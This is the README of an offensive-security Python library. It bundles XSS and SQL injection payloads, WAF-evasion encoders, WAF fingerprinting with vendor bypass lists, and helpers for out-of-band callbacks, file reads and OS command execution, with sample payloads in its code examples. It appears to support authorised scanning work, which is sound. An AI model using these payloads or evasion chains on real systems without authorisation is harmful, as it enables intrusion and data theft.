# commonhuman-payloads

[![Python](https://img.shields.io/badge/Python-3.10%2B-blue.svg)](https://www.python.org/)
[![PyPI](https://img.shields.io/pypi/v/commonhuman-payloads.svg)](https://pypi.org/project/commonhuman-payloads/)
[![License](https://img.shields.io/badge/License-AGPLv3-green.svg)](LICENSE)
[![Zero deps](https://img.shields.io/badge/Dependencies-zero-brightgreen.svg)](pyproject.toml)

**Shared payload collections, encoders, and WAF signatures for CommonHuman-Lab tools** — XSS vectors, SQL injection payloads, evasion transforms, and WAF fingerprints. One place. No duplication.

```bash
pip install commonhuman-payloads
```

---

## Why it exists

The CommonHuman-Lab toolkit is built around the best available payload coverage — every tool draws from the same curated set, applies the same evasion logic, and fingerprints WAFs with the same signatures.

`commonhuman-payloads` is the single source of truth for that coverage. Tools that use it get:

- **Merged and curated** — XSS and SQLi payload lists are independently maintained; evasion strategies and WAF signatures are the union of both tools, keeping the strongest version of each.
- **A single place to improve** — a new bypass technique or WAF signature lands in every tool at once.
- **Zero runtime overhead** — stdlib only. No JSON parsing, no file I/O at import time. Every payload list is a plain Python list you can slice and iterate.
- **Versioned payload database** — `PAYLOAD_VERSION` tracks the payload set independently of the API version so you know exactly what you're scanning with.

---

## Quick start

```python
from commonhuman_payloads.xss import get_basic_payloads, get_payloads_for_context
from commonhuman_payloads.sqli import get_error_payloads, get_boolean_pairs
from commonhuman_payloads.encoders import apply_evasion, EVASION_DOUBLE_ENCODE
from commonhuman_payloads.waf import SIGNATURES, GENERIC_BLOCK_BODIES
```

---

## What's in it

| Module | Purpose |
| ------ | ------- |
| `commonhuman_payloads.xss` | HTML, script, attribute, and advanced XSS payloads — 28 contexts |
| `commonhuman_payloads.sqli` | Error-based, boolean, time-based, UNION, OOB, and advanced SQLi payloads |
| `commonhuman_payloads.encoders` | WAF evasion transform functions — 26 strategies, `apply_evasion()` for single transforms, `apply_evasion_chain()` for sequential chains |
| `commonhuman_payloads.waf` | WAF signature detection, WAF-specific bypass payload lists, and `get_waf_payloads()` |
| `commonhuman_payloads.js_vulns` | Vulnerable JS library database — 10+ `LibSpec` entries covering jQuery, AngularJS, Lodash, Bootstrap, DOMPurify, and more |
| `commonhuman_payloads.markers` | Scan marker generation and reflection helpers |

Two-track versioning:

```python
from commonhuman_payloads import __version__, PAYLOAD_VERSION

__version__     # "0.1.0" — API version (semver)
PAYLOAD_VERSION # "2026.05" — payload database version (year.month)
```

---

## Modules

### `xss`

Context-aware XSS payload lists covering 30 injection contexts — HTML body, every attribute quoting style, all script sub-contexts, AngularJS/Vue templates, dangling markup, DOM clobbering, modern browser APIs, and more.

```python
from commonhuman_payloads.xss import get_basic_payloads, get_payloads_for_context

# Small cross-context set — good for a quick probe
payloads = get_basic_payloads(marker="StingXSS_abc123")
# → ["<img src=x onerror=alert('StingXSS_abc123')>", ...]

# Full list for a specific context
payloads = get_payloads_for_context("attr_double", marker="StingXSS_abc123")
# → ['"><img src=x onerror=alert(\'StingXSS_abc123\')>', ...]
```

Raw lists are also importable directly:

```python
from commonhuman_payloads.xss import (
    HTML_BODY, ATTR_DOUBLE, ATTR_SINGLE, ATTR_UNQUOTED, ATTR_NAME,
    TAG_NAME, TEXTAREA, TITLE, NOSCRIPT, IFRAME_SRCDOC, OBJECT_DATA,
    COMMENT, CSS, CSS_VALUE,
    SCRIPT_STRING_D, SCRIPT_STRING_S, SCRIPT_BARE, SCRIPT_TEMPLATE,
    SCRIPT_REGEX, SCRIPT_COMMENT, EVENT_HANDLER, URL_ATTR, SCRIPT_SRC,
    ANGULAR_TEMPLATE, VUE_TEMPLATE, POLYGLOT, WAF_BYPASS_GLOBAL,
    PROTOTYPE_POLLUTION, STORED_XSS, DOM_CLOBBERING, SANITIZER_BYPASS,
    DATA_URI,  # data: URI injection vectors — plain and base64-encoded SVG/HTML
    # ... and more
)
```

All payloads use `{marker}` as a placeholder. Substitute with `str.replace("{marker}", your_marker)` or use the getter functions which do it for you.

#### Available contexts

`html_body`, `attr_double`, `attr_single`, `attr_unquoted`, `attr_name`, `tag_name`, `textarea`, `title`, `noscript`, `iframe_srcdoc`, `object_data`, `comment`, `css`, `css_value`, `script_string_d`, `script_string_s`, `script_bare`, `script_template`, `script_regex`, `script_comment`, `event_handler`, `url_attr`, `script_src`, `angular_template`, `angular_template_alt`, `angular_attr`, `vue_template`, `js_hoisting`, `dangling_markup`, `polyglot`

Script sub-contexts (`script_bare`, `script_template`, `script_regex`, `script_comment`, `event_handler`) cover JS-layer breakout and execution techniques including indirect calls, constructor chains, `String.fromCharCode`, tagged templates, `throw` tricks, and Unicode line terminators — not just tag injection.

---

### `sqli`

SQL injection payloads for every technique and every major DBMS — MySQL, MariaDB, MSSQL, PostgreSQL, SQLite, Oracle — plus generic/auto mode.

```python
from commonhuman_payloads.sqli import (
    get_error_payloads,
    get_boolean_pairs,
    get_time_payloads,
    get_oob_payloads,
    get_stacked_payloads,
    order_by_probes,
    union_null_probes,
    get_db_contents_payloads,
    get_enum_payloads,
    get_dios_payloads,
    get_lfi_payloads,
    get_privesc_payloads,
    DB_ERROR_PATTERNS,
)

# Error-based payloads for MySQL at default risk
payloads = get_error_payloads("mysql", risk=1)

# Boolean pairs for blind confirmation
pairs = get_boolean_pairs(risk=2)   # list of (true_payload, false_payload)
for true_p, false_p in pairs:
    ...

# Time-based payloads with delay substituted
payloads = get_time_payloads("postgres", delay=5)

# OOB payloads with callback URL
payloads = get_oob_payloads("mssql", callback="https://xyz.oast.me")

# UNION column-count probes
for probe in order_by_probes(max_cols=20):
    ...

# UNION data extraction probes (once column count is known)
for probe in union_null_probes(col_count=3, marker="BreachSQL_abc123"):
    ...

# DB enumeration
payloads = get_db_contents_payloads("mysql", target="tables")
payloads = get_enum_payloads("current_user")   # MySQL-focused enumeration

# DB error pattern matching (use to identify DBMS from error responses)
import re
for dbms, patterns in DB_ERROR_PATTERNS.items():
    for pat in patterns:
        if re.search(pat, response_body, re.IGNORECASE):
            dbms_detected = dbms
```

Risk levels control destructive payload inclusion:

| Risk | Effect |
| ---- | ------ |
| 1 (default) | Safe probes only — no `xp_cmdshell`, no file writes |
| 2 | Adds OR-based boolean pairs (can modify data in broken apps) |
| 3 | Adds OS command execution and filesystem write payloads |

---

### `encoders`

Twenty-six WAF evasion strategies. Apply a single transform with `apply_evasion()`, or chain multiple transforms in sequence with `apply_evasion_chain()`.

```python
from commonhuman_payloads.encoders import (
    apply_evasion, apply_evasion_chain, EVASION_NAMES,
    EVASION_DOUBLE_ENCODE, EVASION_SQL_COMMENT,
)

payload = "<img src=x onerror=alert('xss')>"

# Single transform
encoded = apply_evasion(payload, EVASION_DOUBLE_ENCODE)
# → "%253cimg+src%253dx+onerror%253dalert%2528%2527xss%2527%2529%253e"

sql_payload = "' UNION SELECT 1,2-- -"
obfuscated = apply_evasion(sql_payload, EVASION_SQL_COMMENT)
# → "' /**/UNION/**/ /**/SELECT/**/ 1,2-- -"

# Sequential chain — transforms are applied left to right
chained = apply_evasion_chain(payload, ["unicode", "case"])
# → unicode-escape first, then case-mix the result

# EVASION_NAMES maps human-readable CLI names to constants
# Useful for tools that accept --evasion case,unicode on the command line
print(EVASION_NAMES)
# {"case": "case_mixing", "html": "html_encode", "unicode": "unicode_escape", ...}
```

#### All 26 strategies

| Constant | Strategy | Domain |
| -------- | -------- | ------ |
| `EVASION_NONE` | No transform | — |
| `EVASION_CASE_MIXING` | Alternate upper/lower on alpha chars | Both |
| `EVASION_HTML_ENCODE` | HTML-encode `< > ' " & = ( ) ; -` | Both |
| `EVASION_UNICODE` | `\uXXXX`-escape alphabetic runs | Both |
| `EVASION_DOUBLE_ENCODE` | Double URL-encode `< >` (XSS) or full payload (SQL) | Both |
| `EVASION_CHUNKED_TAGS` | Split tag names, break `on*` handlers with `/**/` | XSS |
| `EVASION_NULL_BYTE` | Insert `\x00` after first `<` | XSS |
| `EVASION_NEWLINE` | Replace spaces with `%0a` | XSS |
| `EVASION_COMMENT_BREAK` | Insert `<!---->` inside HTML tag names | XSS |
| `EVASION_BACKTICK` | Replace quote chars with backticks | XSS |
| `EVASION_CSS_EXPR` | Break `expression` with a CSS comment | XSS |
| `EVASION_FROMCHARCODE` | Encode JS in event handlers and `<script>` blocks via `eval(String.fromCharCode(...))` | XSS |
| `EVASION_UNESCAPE` | Encode JS via `eval(unescape('%XX...'))` — bypasses keyword-based WAF rules | XSS |
| `EVASION_SQL_COMMENT` | Wrap SQL keywords with `/**/` | SQLi |
| `EVASION_SQL_WHITESPACE` | Replace spaces with tabs | SQLi |
| `EVASION_SQL_CASE` | Randomise keyword casing | SQLi |
| `EVASION_SQL_ENCODE` | URL-encode the full payload | SQLi |
| `EVASION_SQL_MULTILINE` | Replace spaces outside strings with `/*\n*/` | SQLi |
| `EVASION_SQL_VERSIONED` | Wrap keywords in versioned MySQL comments — `/*!50000SELECT*/` | SQLi |
| `EVASION_SQL_SPACE_DASH` | Replace spaces with `--rand\n` | SQLi |
| `EVASION_SQL_SPACE_HASH` | Replace spaces with `#rand\n` | SQLi |
| `EVASION_SQL_SPACE_PLUS` | Replace spaces with `+` | SQLi |
| `EVASION_SQL_BLANK_CHARS` | Replace spaces with a random MySQL blank char (`%09/%0b/%0c/%0d`) | SQLi |
| `EVASION_SQL_RANDOM_COMMENTS` | Insert `/**/` between every character of SQL keywords | SQLi |
| `EVASION_SQL_EQUALTOLIKE` | Replace standalone `=` with `LIKE` | SQLi |
| `EVASION_SQL_BETWEEN` | Replace `> N` with `NOT BETWEEN 0 AND N` | SQLi |

The "Domain" column is guidance — tools apply only the strategies they implement.

`XSS_EVASIONS` exports just the 13 XSS-relevant strategies as a list, for tools that want to iterate or auto-select without filtering out the SQLi-specific ones.

---

### `waf`

WAF fingerprinting — signatures, detection logic, and `WafResult`. Tools pass their own `injector.get` method and probe payload; everything else is shared.

```python
from commonhuman_payloads.waf import detect, WafResult, SIGNATURES, GENERIC_BLOCK_BODIES

# Fire a probe and get a result — pass your tool's HTTP callable and probe payload
result: WafResult = detect(
    injector.get,
    url,
    param,
    probe_payload="<script>alert(1)</script>",  # XSS probe
    check_reflection=True,
)

if result.detected:
    print(result.name, result.confidence, result.evasions)
```

Once a WAF is identified, retrieve its curated bypass payload list:

```python
from commonhuman_payloads.waf.payloads import get_waf_payloads

payloads = get_waf_payloads("Cloudflare")
for p in payloads:
    rendered = p.replace("{marker}", my_marker)
    # inject rendered ...
```

`get_waf_payloads()` returns `[]` for unknown WAF names — safe to call without a check.

`check_reflection=False` for SQLi probes — SQL payloads aren't reflected the same way.

Scoring algorithm (header +2, body match +1, status code +1):

- Score **≥ 2** → WAF identified (medium confidence)
- Score **≥ 4** → high confidence

Each `WafSignature.evasions` list contains the recommended strategies to try in order, merged from both XSS and SQLi tool experience. Tools apply only the strategies they implement — unknown constants are ignored by `apply_evasion()`.

#### Covered WAFs

Cloudflare · Akamai · Imperva · AWS WAF · ModSecurity · Sucuri · F5 BIG-IP ASM · Barracuda · Wordfence · Fortinet FortiWeb

---

### `js_vulns`

Database of JavaScript libraries with known XSS / prototype-pollution CVEs. Each `LibSpec` entry carries URL patterns, a version regex, an inline fingerprint string, and a `vuln_if` callable that checks whether a detected version falls in the vulnerable range.

```python
from commonhuman_payloads.js_vulns import KNOWN_VULNERABLE_LIBS, LibSpec, _ver

for spec in KNOWN_VULNERABLE_LIBS:
    print(spec.library_id, spec.cve)
    print(spec.advisory)

    # Check a detected version
    detected = _ver("3.4.1")           # → (3, 4, 1)
    if spec.vuln_if(detected):
        print(f"Vulnerable: {spec.display_name}")

# URL pattern matching (check a <script src> URL)
import re
url = "https://cdn.example.com/jquery-3.4.1.min.js"
for spec in KNOWN_VULNERABLE_LIBS:
    if any(re.search(p, url) for p in spec.url_patterns):
        # Extract version from URL or inline source using spec.ver_regex
        ...
```

Covered libraries: jQuery (2 CVE groups), AngularJS, Bootstrap (v3 and v4), Lodash, Moment.js, Vue.js, Handlebars, DOMPurify, Underscore.js.

---

### `markers`

```python
from commonhuman_payloads.markers import make_marker, is_reflected

# Tools pass their own prefix to keep markers namespaced in logs
marker = make_marker(prefix="StingXSS_")   # → "StingXSS_f3k9x2"
marker = make_marker(prefix="BreachSQL_")  # → "BreachSQL_m7p1q8"

# Confirm reflection in a response body
if is_reflected(marker, response.text):
    ...
```

---

## Design principles

- **Zero runtime dependencies** — stdlib only. Each tool keeps its own network/browser deps.
- **Data, not behaviour** — payload lists are plain Python. No classes, no registries. Slice them, extend them, filter them.
- **Best-of-both** — evasion constants and WAF signatures are merged from stingxss and breachsql, keeping the strongest version of each.
- **Payload version is independent of API version** — `PAYLOAD_VERSION` (`"2026.05"`) lets you pin and audit the payload database separately from the code.
- **No magic substitution** — payloads use `{marker}` as a literal placeholder; tools call `str.replace("{marker}", marker)` themselves. No hidden format calls.

---

## Tests

```bash
git clone https://github.com/commonhuman-lab/commonhuman-payloads.git
cd commonhuman-payloads
python -m venv .venv && source .venv/bin/activate
pip install -e ".[dev]"
pytest
```

---

## License

Licensed under the [AGPLv3](LICENSE).
You are free to use, modify, and distribute this software. If you run it as a service or distribute it, the source must remain open.

For commercial licensing, contact the author.
